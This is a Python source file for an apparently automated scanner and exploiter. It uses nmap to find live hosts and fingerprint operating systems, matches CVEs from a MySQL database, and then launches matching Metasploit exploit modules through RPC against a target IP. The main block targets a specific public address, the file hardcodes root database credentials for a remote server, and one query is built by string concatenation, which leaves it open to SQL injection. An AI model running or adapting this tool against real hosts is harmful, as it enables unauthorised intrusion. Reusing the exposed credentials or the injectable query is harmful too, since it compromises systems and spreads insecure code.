import nmap
import gc
import pymysql
import models
import models.sqlAssist
from pymetasploit3.msfrpc import MsfRpcClient



def host_live(list):
    nm = nmap.PortScanner()  # 导入函数
    m = 0
    for i in list:
        b = nm.scan(i, arguments='-sP')
        up_hosts = nm.all_hosts()  # 获取活主机
        # 绑定网段与扫描模式
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]  # 定义字典
        m = m + 1
        for host, status in hosts_list:  # 将字典里的状态赋值给host，status
            # print  (host)
            if (m == 1):
                alivelist = []
                alivelist.append(host)
            else:
                alivelist.append(host)
            # 输出扫描结果
    return alivelist



def connectdb():
    print('连接到mysql服务器...')
    # 打开数据库连接
    # 用户名:hp, 密码:Hp12345.,用户名和密码需要改成你自己的mysql用户名和密码，并且要创建数据库TESTDB，并在TESTDB数据库中创建好表Student
    db = pymysql.Connect(host='120.78.174.237', user='root', passwd='208toor208', db="scanning")
    print('连接上了!')
    return db


def cveProductmatch(db,a):
    cursor = db.cursor()
    try:
        # SQL 插入语句：
        string = "SELECT * FROM cve_product where vendor = '"+a+"' "
        # value = [item['cve_id'],item['product_type'],item['vendor'],item['product'],item['version'],item['update'],item['edition'],item['language']]
        cursor.execute(string)
        result = cursor.fetchall()
        return result
    except Exception as e:
        print(e)



def scan(host):
    # 扫描函数
    # -A 是全面扫描，-sS ：半开放扫描（非 3 次握手的 tcp 扫描），速度快,-sV探测端口服务版本
    nm = nmap.PortScanner()
    output = nm.scan(hosts=host, arguments='-F -T4 -Pn -sS -O')
    count = output['nmap']['scanstats']['uphosts']

    for result in output['scan'].values():
        if result['status']['state'] == 'up':
            host_list = result['addresses']['ipv4']
            vendor = result['vendor']
            reason = result['status']['reason']
            port = result['portused']
            os = result['osmatch']
        del host, result
        gc.collect()
    data = {"count": count, "IP": host_list, "OS": os, "port": port, "reason": reason, "vendor": vendor}
    return data

def portlist_scan(iplist):
    ipactive = host_live(iplist)
    productlist = []
    for ip in ipactive:
        res = scan(ip)
        response = res['OS']
        for detail in response:
            # print(detail)
            if detail['osclass'] != None:
                if detail['osclass'][0] != None:
                    product = {
                        'name': detail['name'],
                        'ip': res['IP'],
                        'type': detail['osclass'][0]['type'],
                        'vendor':detail['osclass'][0]['vendor'],
                        'os':detail['osclass']
                    }
                    productlist.append(product)
    return productlist

def vul_scan(db,ip):
    productlist = []
    res = scan(ip)
    response = res['OS']
    for detail in response:
        # print(detail)
        if detail['osclass'] != None:
            if detail['osclass'][0] != None:
                product = {
                    'name': detail['name'],
                    'ip': res['IP'],
                    'type': detail['osclass'][0]['type'],
                    'cve': [],
                    'vendor': detail['osclass'][0]['vendor'],
                    'os': detail['osclass']
                }
                for os in detail['osclass']:
                    if os['osgen'] != None:
                        osgen = os['osgen'].replace('X', '')
                        item = {
                            'vendor': os['vendor'],
                            'product': os['osfamily'],
                            'version': osgen,
                        }
                        cvelist = models.sqlAssist.cveProduct(db, item)
                        for cve in cvelist:
                            product['cve'].append(cve['cve_id'])
                productlist.append(product)
    return productlist

def vul_exp(ip,vul_list):
    list = []
    try:
        client = MsfRpcClient('password', ssl=True)
        for vul in vul_list:
            cid = client.consoles.console().cid
            client.consoles.console(cid).write("search " + vul)
            exp = client.consoles.console(cid).read()
            exploit = client.modules.use('exploit', exp)
            exploit['RHOSTS'] = ip
            res = client.consoles.console(cid).run_module_with_output(exploit, payload='')
            if 'success' in res:
                list.append(vul)
    except Exception as e:
        print(e)
    return list

if __name__=="__main__":
    db = pymysql.connect(host, username, passwd, dbname)
    # list = portlist_scan(['49.205.165.83','115.89.233.131'])
    list = vul_scan(db,'49.205.165.83')
    for i in list:
        print(i)
    db.close()